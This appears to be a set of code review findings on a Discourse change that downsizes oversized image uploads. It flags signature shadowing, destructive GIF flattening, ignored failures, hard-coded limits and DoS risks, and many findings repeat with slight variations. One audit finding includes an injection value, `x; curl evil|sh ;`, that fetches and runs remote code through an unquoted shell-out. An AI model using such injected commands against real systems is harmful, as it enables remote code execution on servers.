findings.issue_text: app/models/optimized_image.rb:149 — `def self.downsize(from, to, dimensions, opts={})` silently replaces the `downsize(from, to, max_width, max_height, opts={})` defined four lines earlier (Ruby has no overloading), so the 4-positional-arg contract is dead code and any existing caller `downsize(from, to, w, h)` now binds `h` to `opts`, making `opts[:allow_animation]` / `opts[:force_aspect_ratio]` raise TypeError on an Integer instead of downsizing (P1, conf 75)

app/models/optimized_image.rb:115 — FORMAT-DRIFT: the controller passes the percent geometry `"80%"` but the animated path `downsize_instructions_animated` -> `resize_instructions_animated` emits `gifsicle --resize-fit #{dimensions}`, which only accepts `WxH` (percent needs `--scale`), so every oversize animated GIF with `allow_animated_thumbnails` on fails all 5 attempts and is then rejected as too large (P1, conf 75)

app/controllers/uploads_controller.rb:67 — SENTINEL-MEANING-CHANGE: `allow_animation: SiteSetting.allow_animated_thumbnails` is a thumbnail-policy setting repurposed to govern the user's ORIGINAL upload; when it is off, `convert #{from}[0] ... #{to}` with from==to flattens an oversize animated GIF to its first frame in place, permanently destroying the original the user uploaded (P1, conf 75)

app/controllers/uploads_controller.rb:66 — CASCADING-FAILURE: the boolean return of `OptimizedImage.downsize` is discarded and the loop condition is only `attempt > 0 && tempfile.size > max`, so a failing convert (bad format, corrupt input, missing binary) is re-executed 5 times identically, and an in-place `convert ... #{tempfile.path}` that fails mid-write leaves a truncated file at the same path that is then handed to `Upload.create_for` as the user's upload (P1, conf 75)

app/controllers/uploads_controller.rb:65 — up to 5 synchronous ImageMagick `convert` shell-outs plus 5 `ImageOptim.new.optimize_image!` runs (each spawning jpegoptim/optipng/pngquant/etc.) on a 10MB image execute inside the request cycle with no wall-clock bound, while the existing design keeps all image processing in `Jobs.enqueue(:create_thumbnails)`; every pass also lossy re-encodes JPEGs and shrinks pixels to 0.8^2 per pass (~11% after 5), so a single upload can pin a unicorn worker for tens of seconds (P1, conf 75)

app/assets/javascripts/discourse/lib/utilities.js:182 — `var maxSizeKB = 10 * 1024` replaces `Discourse.SiteSettings['max_' + type + '_size_kb']` for ALL types, so attachment uploads no longer honour `max_attachment_size_kb` client-side and the `file_too_large` message now reports 10240 KB as the limit for files the server will still reject at the admin-configured size (P2, conf 75)

app/controllers/uploads_controller.rb:55 — the 10MB ceiling is hard-coded three times (`10.megabytes` here, `10 * 1024` at utilities.js:182 and :246) with no site setting or shared constant, so the client limit, the API-download limit, and the web-server `client_max_body_size` are three independent numbers that will drift; the API path also raises the download cap for non-image attachment types that get no downsizing (P2, conf 75)

app/controllers/uploads_controller.rb:64 — the downsize gate is `FileHelper.is_image?(filename)` with no SVG exclusion, whereas `OptimizedImage.create_for` (optimized_image.rb:44) explicitly bypasses `resize` for `.svg`; here `convert file.svg[0] -resize 80%\> file.svg` rasterizes the vector and rewrites it through ImageMagick's SVG writer, producing a larger not smaller file that fails the size check on every attempt (P2, conf 50)

app/models/optimized_image.rb:145 — ADVISORY: the unreachable 4-arg `downsize` should be deleted (or the new API expressed as a single `downsize(from, to, dimensions, opts)` with callers formatting `"#{w}x#{h}"`); deletion test: removing lines 145-147 changes no behaviour because Ruby already dispatches every call to line 149 (P3, conf 100)

app/controllers/uploads_controller.rb:64-69 — Diff adds a new server-side downsize loop, a new 3-arity OptimizedImage.downsize, and changes client validation, yet contains zero spec/QUnit changes (no spec/controllers/uploads_controller_spec.rb, spec/models/optimized_image_spec.rb, or utilities-test.js update), so the "large image is reduced under max_image_size_kb" acceptance criterion is unverified. (P1, conf 100)

app/models/optimized_image.rb:145-151 — `def self.downsize(from, to, max_width, max_height, opts={})` is immediately redefined by `def self.downsize(from, to, dimensions, opts={})` (Ruby keeps the last definition), so every existing caller using the (from, to, w, h, opts) signature (Upload.create_for max_image_width/height downsizing, CookedPostProcessor/CreateThumbnails) now passes the height integer as `opts` and raises NoMethodError on `opts[:allow_animation]`; the callers were not updated in this diff. (P1, conf 75)

app/controllers/uploads_controller.rb:67 — `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` return value (false on convert/ImageOptim failure) is discarded, so a failed in-place convert leaves a truncated/partially-written tempfile that is then handed to `Upload.create_for` as if it were valid. (P1, conf 75)

app/controllers/uploads_controller.rb:66-68 — After 5 failed attempts the still-oversized file falls through to `Upload.create_for(current_user.id, tempfile, ...)` with no explicit rejection or user-facing message in this diff; correctness depends entirely on create_for's out-of-diff size check, which the task did not verify or test. (P2, conf 75)

app/controllers/uploads_controller.rb:67 — With `allow_animated_thumbnails` false (the default), an oversized animated GIF is run through `convert #{from}[0] ... -resize 80%` in place, permanently flattening the user's ORIGINAL upload to its first frame; the setting governs thumbnails, not originals, and this new destructive path is not gated or documented. (P1, conf 75)

app/models/optimized_image.rb:137-139,126-134 — When `allow_animation` is true the "80%" dimension string is forwarded to `gifsicle --resize-fit 80%`, which only accepts WxH, so every animated-GIF downsize attempt fails (5 times) and the oversized GIF is passed through untouched; no percent-dimension handling exists for the animated branch. (P1, conf 75)

app/controllers/uploads_controller.rb:55,64 — API URL uploads get a tempfile named `discourse-upload-#{type}` with no extension, so `from =~ /\.GIF$/i` never matches and animated GIFs fetched via API are always flattened via `[0]` regardless of `allow_animated_thumbnails`. (P2, conf 75)

app/controllers/uploads_controller.rb:66 — `tempfile.size` on an open Tempfile uses fstat on the original fd; when ImageOptim replaces the file by rename (new inode) the fd sees the stale, unlinked file, so the loop re-runs on stale size and `Upload.create_for` reads the OLD bytes through the same fd. (P1, conf 50)

app/assets/javascripts/discourse/lib/utilities.js:182 — `var maxSizeKB = 10 * 1024;` replaces `max_' + type + '_size_kb` for BOTH types, so `max_attachment_size_kb` is no longer enforced client-side for non-image attachments (they now round-trip to the server to be rejected) and an admin raising `max_image_size_kb` above 10MB is silently overridden by the hard-code. (P2, conf 75)

app/assets/javascripts/discourse/lib/utilities.js:246 — The 413 handler now reports a fixed "10MB" in `post.errors.file_too_large` regardless of the actual web-server body limit or any site setting, giving users a wrong number when nginx `client_max_body_size` differs. (P3, conf 75)

app/controllers/uploads_controller.rb:55 — `FileHelper.download(url, 10.megabytes, ...)` hard-codes the new ceiling with no corresponding site setting, while the multipart branch (`file.tempfile`) has no server-side ceiling at all before the downsize loop, so the server accepts arbitrarily large images for up to 5 ImageMagick passes; sibling settings max_image_size_kb / max_attachment_size_kb no longer bound the pre-processing cost. (P2, conf 75)

app/controllers/uploads_controller.rb:64 — `FileHelper.is_image?(filename)` matches svg (per utilities.js isAnImage), so oversized SVGs are rewritten by `convert -resize 80%` to the same .svg path, producing an ImageMagick-emitted rasterised SVG rather than the original vector; no svg exclusion exists. (P2, conf 50)

app/controllers/uploads_controller.rb:64 — ADVISORY: downsizing runs before authorized_extensions / new-user upload permission checks in Upload.create_for, so unauthenticated-for-upload users can still trigger up to 5 ImageMagick invocations on a 10MB file before being rejected; consequence is CPU DoS surface, rebutted if create_for-style gating is added ahead of the loop. (P2, conf 50)

app/controllers/uploads_controller.rb:66 — `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` overwrites the only copy of the user's original in place before `Upload.create_for` runs, so the canonical Upload row (sha1, filesize, width/height) and the stored blob are derived from a lossy re-encode (up to 5 chained 80% passes, ~33% linear / ~10% pixel area worst case) and the original bytes are unrecoverable; there is no backup, no flag on the Upload, and no way to revert (P1, conf 100)

app/models/optimized_image.rb:174 — `#{from}[0]` in `downsize_instructions` selects frame 0, so with `allow_animated_thumbnails` false (the default) any large animated GIF is silently flattened to a single static frame and that flattened file is what gets persisted as the primary Upload, not just as a thumbnail (P1, conf 100)

app/controllers/uploads_controller.rb:66 — the return value of `OptimizedImage.downsize` is discarded, so when `convert` exits non-zero after ImageMagick has already opened/truncated `to` (== the source path), the loop continues and a zero-length or partially written tempfile is handed to `Upload.create_for` and persisted as a corrupt upload instead of falling back to the untouched original (P1, conf 75)

app/controllers/uploads_controller.rb:65 — `tempfile.size` is fstat on the Tempfile's open fd; `convert_with` then calls `ImageOptim.new.optimize_image!(to)`, which replaces the file by rename (new inode), so after the first pass `tempfile.size` keeps reporting the ORIGINAL size: the loop runs all 5 passes unconditionally, `Upload.create_for(..., tempfile.size, ...)` records the pre-downsize filesize (and re-fails the max_image_size_kb check), and any fd-based reads (FastImage.size on the IO, `file.read` in the store) see the unlinked original bytes while `Digest::SHA1.file(path)` hashes the new bytes, yielding an Upload whose sha1/filesize/dimensions/blob disagree with each other (P1, conf 50)

app/models/optimized_image.rb:149 — the new 3-arg `def self.downsize(from, to, dimensions, opts={})` redefines and shadows the 5-arg `downsize(from, to, max_width, max_height, opts)` declared 4 lines above, so every existing caller passing width and height now has `height` bound as `opts` and `max_width` alone used as the geometry (`-resize 100` instead of `100x100`), and `opts[:allow_animation]` on an Integer raises TypeError, breaking downsized thumbnail generation for existing uploads (P1, conf 75)

app/models/optimized_image.rb:151 — `convert_with` runs `ImageOptim.optimize_image!` on the persisted source file, whose jpegoptim/jpegtran workers strip all metadata by default while `-resize` is applied without `-auto-orient`, so EXIF orientation is discarded from the stored original and portrait photos from phones are permanently persisted rotated (P2, conf 50)

app/controllers/uploads_controller.rb:66 — ADVISORY: sha1 dedup in `Upload.create_for` now hashes the re-encoded output rather than the user's bytes; ImageMagick writes `date:create`/`date:modify` tEXt chunks into PNG output, so the same large PNG uploaded twice produces two distinct sha1s and two stored copies instead of one deduplicated Upload; rebuttal gate: if image_optim's pngcrush `-rem alla` step reliably strips those chunks on every deployment the hashes converge (P2, conf 50)

app/models/optimized_image.rb:145-151 — `def self.downsize(from, to, max_width, max_height, opts={})` is immediately overwritten by `def self.downsize(from, to, dimensions, opts={})` (Ruby last-definition-wins), so the 4-dimension form is dead code and any existing caller passing (from, to, width, height, opts) raises ArgumentError (given 5, expected 3..4) while a caller passing (from, to, width, height) binds the Integer height to `opts` and crashes on `opts[:allow_animation]` with TypeError; the snapshot omits lib/ and jobs/ so external callers cannot be verified here, but the duplicate definition is a defect regardless (P1, conf 75)

app/controllers/uploads_controller.rb:66-67 — the loop condition `tempfile.size > SiteSetting.max_image_size_kb.kilobytes` re-reads size through the still-open Tempfile fd (fstat), but `convert_with` runs `ImageOptim.new.optimize_image!(to)` which replaces the file at that path via rename to a new inode, so `tempfile.size` keeps reporting the ORIGINAL size, the loop always burns all 5 attempts, and `Upload.create_for(..., tempfile, filename, tempfile.size, ...)` is handed the stale handle/size of the un-shrunk file (P1, conf 50)

app/controllers/uploads_controller.rb:67 — `tempfile.path` for a Rack multipart upload is an extensionless `RackMultipart…` path, so `from =~ /\.GIF$/i` in `optimize` never matches and `allow_animation: SiteSetting.allow_animated_thumbnails` is dead; every animated GIF goes through `convert #{from}[0]` and is flattened to its first frame in place before upload (P2, conf 75)

app/controllers/uploads_controller.rb:67 — ADVISORY: `OptimizedImage.downsize` returns false on ImageMagick failure (`convert_with` rescues and returns false) but the return value is ignored, so a non-image renamed .png (or missing `convert`) silently loops 5 times and proceeds to `Upload.create_for` with the oversized file, which then rejects it with the generic too-large error; rebuttal "Upload.create_for still enforces the limit" holds for safety but not for the 5 wasted shell-outs per request (P3, conf 75)

app/assets/javascripts/discourse/lib/utilities.js:182 — `var maxSizeKB = 10 * 1024; // 10MB` replaces `Discourse.SiteSettings['max_' + type + '_size_kb']`, silently changing the user-facing limit semantics for every upload type: attachments (never downsized server-side) lose their admin-configured `max_attachment_size_kb` client check, and sites whose `max_image_size_kb` is above 10240 now reject images client-side that the admin explicitly allowed; the task asked for large images to be downsized, not for the configurable limit to become a hard-coded constant (P1, conf 90)

app/assets/javascripts/discourse/lib/utilities.js:246 — 413 handler `var maxSizeKB = 10 * 1024; // 10 MB` reports "10240 KB" as the limit regardless of the actual nginx/server body limit or `max_image_size_kb`, so the error message now states a number that is not the threshold that rejected the request (P2, conf 85)

app/controllers/uploads_controller.rb:55 — `FileHelper.download(url, 10.megabytes, ...)` replaces the `SiteSetting.max_image_size_kb.kilobytes` cap for API URL uploads, so an admin who raised `max_image_size_kb` above 10240 now has API image fetches silently truncated/refused (download returns nil -> `tempfile.size` NoMethodError caught by the generic rescue), a regression not asked for by "downsize large images" (P2, conf 75)

app/controllers/uploads_controller.rb:65-69 — `attempt = 5; while attempt > 0 && tempfile.size > SiteSetting.max_image_size_kb.kilobytes` gives up after five 80% linear passes (~10.7% of original pixels) and then unconditionally calls `Upload.create_for(current_user.id, tempfile, filename, tempfile.size, ...)`, which rejects the still-too-large file with the size error; the promised "will be automatically reduced to allowed size" is therefore not guaranteed for images more than ~10x over the limit, and a `convert_with` failure (returns false) is ignored so the loop just repeats the failing command (P1, conf 85)

app/controllers/uploads_controller.rb:67 — for animated GIFs with `allow_animated_thumbnails` on, `OptimizedImage.downsize(..., "80%", allow_animation: ...)` dispatches to `downsize_instructions_animated` -> gifsicle `--resize-fit 80%`; gifsicle's `--resize-fit` takes WxH not a percentage (percent scaling is `--scale`), so the command fails, `convert_with` returns false, and oversized animated GIFs are never downsized and reach `Upload.create_for` unchanged to be rejected (P2, conf 70)

app/models/optimized_image.rb:145-151 — ADVISORY: the 4-arg `def self.downsize(from, to, max_width, max_height, opts={})` is immediately shadowed by `def self.downsize(from, to, dimensions, opts={})` (Ruby has no overloading), so the existing public signature is dead and any caller passing width and height integers now gets `opts = max_height` and raises `NoMethodError` on `opts[:allow_animation]`; the refactor changed the API contract without that being part of the feature; rebuttal: no such caller exists in this snapshot (P2, conf 50)

app/controllers/uploads_controller.rb:67 — `OptimizedImage.downsize(...)` return value is discarded; on a non-zero `convert` exit (`convert_with` returns false at optimized_image.rb:163 WITHOUT logging, stderr sent to `/dev/null`) the loop silently re-runs the failing command 5 times and then hands the untouched oversize file to `Upload.create_for`, so the user gets a generic size rejection and operators get zero log evidence that downsizing was attempted or why it failed (P1, conf 100)

app/controllers/uploads_controller.rb:67 — in-place `convert from[0] ... to` with `from == to` truncates the original before the write completes; if convert dies mid-write (OOM kill, disk full, worker restart) the partially-written file is now SMALLER than `max_image_size_kb.kilobytes`, so the `while` at line 66 exits and the corrupt image is passed to `Upload.create_for` and stored as a successful upload (P1, conf 75)

app/controllers/uploads_controller.rb:66 — `tempfile.size` on an open Rack Tempfile is an fstat of the original fd/inode, but `convert_with` calls `ImageOptim.new.optimize_image!(to)` (optimized_image.rb:165) which replaces the path via tmp-copy + rename; after the first iteration the fd points at the unlinked pre-optim inode, `tempfile.size` never reflects later iterations (up to 4 wasted convert runs), and `Upload.create_for` receives a Tempfile whose fd content (old inode) differs from its path content (new inode), so sha1/dimensions read via path and bytes stored via fd disagree (P1, conf 75)

app/controllers/uploads_controller.rb:67 — with `SiteSetting.allow_animated_thumbnails` false (default) an oversize animated GIF goes through `downsize_instructions` which reads `#{from}[0]` (optimized_image.rb:129) and overwrites the upload with only its first frame, silently converting an animation into a static image and reporting success (P1, conf 100)

app/models/optimized_image.rb:138 — `downsize_instructions_animated` delegates to gifsicle `--resize-fit "80%"`; gifsicle's `--resize-fit` only accepts `WxH` pixel dimensions (percent scaling is `--scale`), so every animated-GIF downsize exits non-zero, the error is swallowed by `&> /dev/null` and the ignored return value, and the upload is rejected for size after 5 futile shell-outs (P1, conf 75)

app/models/optimized_image.rb:150 — `self.downsize(from, to, dimensions, opts={})` redefines the `self.downsize(from, to, max_width, max_height, opts={})` declared 4 lines earlier (Ruby last-definition-wins), so any existing 5-positional-arg caller raises ArgumentError and a 4-arg `(from, to, w, h)` caller raises TypeError at `opts[:allow_animation]` on an Integer; the diff updates no callers (P1, conf 50)

app/models/optimized_image.rb:162 — the ImageMagick/gifsicle shell-out has no timeout, resource limit, or dimension check; a 10 MB decompression-bomb JPEG/PNG (tiny bytes, enormous pixel dimensions) now runs `convert` up to 5 times in the request/Defer thread with unbounded CPU and memory, pinning the unicorn worker and with the failure invisible because stderr is discarded (P2, conf 75)

app/assets/javascripts/discourse/lib/utilities.js:182 — client-side check is now a hard-coded 10240 KB for ALL types, so (a) when `max_image_size_kb` > 10240 the client rejects images the server would accept, and (b) attachments between `max_attachment_size_kb` and 10 MB are fully uploaded before the server rejects them, with the client message quoting 10240 KB rather than the real limit (P2, conf 100)

app/controllers/uploads_controller.rb:66 — after 5 attempts at 80% linear (~11% of original pixel area) images that still exceed `max_image_size_kb` (e.g. small `max_image_size_kb`, high-entropy content, metadata-heavy PNG) are rejected by `Upload.create_for` with the server-side limit while the client advertised 10 MB, so the feature reports "file too large" for a file the UI explicitly accepted (P2, conf 75)

app/assets/javascripts/discourse/lib/utilities.js:246 — ADVISORY: 413 is emitted by the reverse proxy (`client_max_body_size`), yet the handler now tells the user the limit is a hard-coded 10240 KB; works today only where nginx happens to be configured to 10m, and reports a false limit on any other deployment (P3, conf 75)

app/controllers/uploads_controller.rb:67 — ADVISORY: `FileHelper.is_image?` matches `.svg`, so an oversize SVG is fed to `convert` in place and rewritten by ImageMagick's SVG encoder as a rasterised wrapper (vector content lost) while `OptimizedImage.create_for` deliberately special-cases SVG to avoid convert (optimized_image.rb:45); works today until someone uploads an SVG above the limit (P2, conf 50)

app/assets/javascripts/discourse/lib/utilities.js:182 — `var maxSizeKB = 10 * 1024; // 10MB` replaces `Discourse.SiteSettings['max_' + type + '_size_kb']` for every upload type, so attachments (which the server never downsizes) now bypass the admin-configured `max_attachment_size_kb` on the client and are only rejected server-side after a full upload; not traceable to "downsize large images" (P1, conf 90)

app/controllers/uploads_controller.rb:55 — `FileHelper.download(url, 10.megabytes, ...)` raises the API URL-download cap for all `type`s including non-image attachments, silently ignoring the configured size settings for files that are never downsized; scope expansion beyond images (P2, conf 75)

app/models/optimized_image.rb:143-149 — the 5-arg `def self.downsize(from, to, max_width, max_height, opts={})` is immediately redefined by the 3-arg `def self.downsize(from, to, dimensions, opts={})`, leaving the first definition as unreachable dead code and silently changing the public `downsize` contract for any existing width/height callers; the feature only needed a new string-dimension entry point, not a signature rewrite of `resize`/`optimize` and removal of `dimensions` (P2, conf 85)

app/assets/javascripts/discourse/lib/utilities.js:246 — 413 handler now reports `10 * 1024` as the limit regardless of the server's actual configured `max_image_size_kb`/nginx limit, so the error message no longer reflects the real rejection threshold; unrelated behavior change for the stated feature (P3, conf 75)

app/controllers/uploads_controller.rb:64-69 — ADVISORY: the 10MB ceiling (duplicated in JS twice and in the controller), the `"80%"` shrink factor, and `attempt = 5` are hard-coded magic numbers with no site setting; consequence is admins cannot tune the new downsizing behavior and the three 10MB constants will drift independently; rebuttal: acceptable if a follow-up adds a setting (P3, conf 60)

app/controllers/uploads_controller.rb:67 — ADVISORY: `allow_animation: SiteSetting.allow_animated_thumbnails` repurposes a thumbnail-specific setting to govern whether original GIF uploads are shrunk via gifsicle vs. flattened to a single frame by `convert #{from}[0]`; consequence is sites with animated thumbnails disabled get their uploaded animated GIFs silently de-animated on upload; rebuttal: intentional if maintainers consider that setting global (P2, conf 50)

app/controllers/uploads_controller.rb:55-67 — In the API path the tempfile is created as `Tempfile.new(["discourse-upload-#{type}", ext])` where `type` is the raw `params.require(:type)` string (and `ext` derives from the user URL); that path is then passed as `from`/`to` into `OptimizedImage.downsize` and reaches `convert_with`'s unquoted backtick shell (`optimized_image.rb:161`) via `#{from}[0]` / `#{to}`, so a type value like `x; curl evil|sh ;` yields remote command execution on the web worker for any API-key holder (P0, conf 75)

app/controllers/uploads_controller.rb:64-69 — Any logged-in user can now trigger up to 5 synchronous `convert` + ImageOptim runs in the web process (or the in-process Scheduler::Defer thread) on an unvalidated file up to 10MB with no pixel-dimension/memory cap; a decompression-bomb PNG/JPEG (tiny bytes, e.g. 30000x30000 px) forces multi-GB ImageMagick allocations five times per request and starves/kills the Unicorn worker, whereas before this change oversized files were rejected before any image processing (P1, conf 75)

app/controllers/uploads_controller.rb:64 — `FileHelper.is_image?(filename)` gates on the user-supplied filename extension only, but ImageMagick selects the coder from magic bytes, so a PostScript/PDF/SVG/MVG payload renamed `.png` and sized above max_image_size_kb is fed to `convert` (and its ghostscript/MSL delegates) before `Upload.create_for`'s FastImage/extension validation ever runs, moving delegate-coder exploitation from a post-validation background job into the pre-validation request path (P1, conf 75)

app/controllers/uploads_controller.rb:66 — ADVISORY: `tempfile.size` on an open Tempfile fstats the original fd, and ImageOptim `optimize_image!` (called in `convert_with`) replaces the file by rename, so the loop condition never observes the shrunken size and all 5 ImageMagick invocations always execute for any over-limit image, amplifying the DoS surface and passing the stale pre-resize `tempfile.size` to `Upload.create_for` (P2, conf 50)

app/controllers/uploads_controller.rb:55 — ADVISORY: the API `FileHelper.download(url, ...)` uses an unrestricted user URL (open-uri, no private-IP/redirect filtering) and this change raises the fetch cap from max_image_size_kb to a hard 10MB for all upload types including attachments, widening a pre-existing SSRF/bandwidth-amplification primitive for API-key holders (P2, conf 50)

app/models/optimized_image.rb:149 — `def self.downsize(from, to, dimensions, opts={})` is defined immediately after `def self.downsize(from, to, max_width, max_height, opts={})` at :145, so Ruby's last-definition-wins silently replaces the 4/5-arg form; any existing spec or caller invoking `OptimizedImage.downsize(from, to, w, h)` now binds `dimensions=w, opts=h` and raises `TypeError` at `opts[:allow_animation]` (Integer#[] with a Symbol), and the 5-arg call `downsize(from, to, w, h, opts)` raises ArgumentError — the dead :145 definition means no test can ever exercise the width/height path it claims to keep (P1, conf 100)

app/models/optimized_image.rb:153 — `optimize(operation, from, to, dimensions, opts)` arity dropped from 6 to 5 and `dimensions` was deleted; a spec that stubs `OptimizedImage.expects(:optimize).with("resize", from, to, 5, 5, {})` or `.stubs(:optimize).returns(true)` still passes green while the real `optimize` would receive `"5x5"`, so the stub-based `create_for` coverage no longer proves the resize path works and a spec asserting `OptimizedImage.dimensions(5, 5) == "5x5"` fails with NoMethodError (P2, conf 50)
